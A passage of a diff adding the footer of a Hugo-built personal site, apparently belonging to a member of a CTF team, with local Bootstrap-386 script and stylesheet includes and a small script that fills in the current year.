+
+    | Certified scriptkid @ <a href="https://ctftime.org/team/113107">Corax</a> &amp; <a href="https://itemize.no/">Itemize</a>
+
+
+        | Built on <a href="//gohugo.io" target="_blank">Hugo</a>
+
+</p>
+    <p class="text-center">
+        
+        
+        
+        
+        
+    </p>
+</footer>
+
+</body><link rel="stylesheet" href="/css/bootstrap.css">
+<link rel="stylesheet" href="/css/bootstrap-responsive.css">
+<link rel="stylesheet" href="/css/style.css">
+
+<script src="/js/jquery.js"></script>
+<script src="/js/bootstrap-386.js"></script>
+<script src="/js/bootstrap-transition.js"></script>
+<script src="/js/bootstrap-alert.js"></script>
+<script src="/js/bootstrap-modal.js"></script>
+<script src="/js/bootstrap-dropdown.js"></script>
+<script src="/js/bootstrap-scrollspy.js"></script>
+<script src="/js/bootstrap-tab.js"></script>
+<script src="/js/bootstrap-tooltip.js"></script>
+<script src="/js/bootstrap-popover.js"></script>
+<script src="/js/bootstrap-button.js"></script>
+<script src="/js/bootstrap-collapse.js"></script>
+<script src="/js/bootstrap-carousel.js"></script>
+<script src="/js/bootstrap-typeahead.js"></script>
+<script src="/js/bootstrap-affix.js"></script>
+<script>
+    _386 = { 
+        fastLoad: false ,
+        onePass: true , 
+        speedFactor: 3 
+    };
+
+    
+    function ThisYear() {
+        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
+    };
+</script></html>
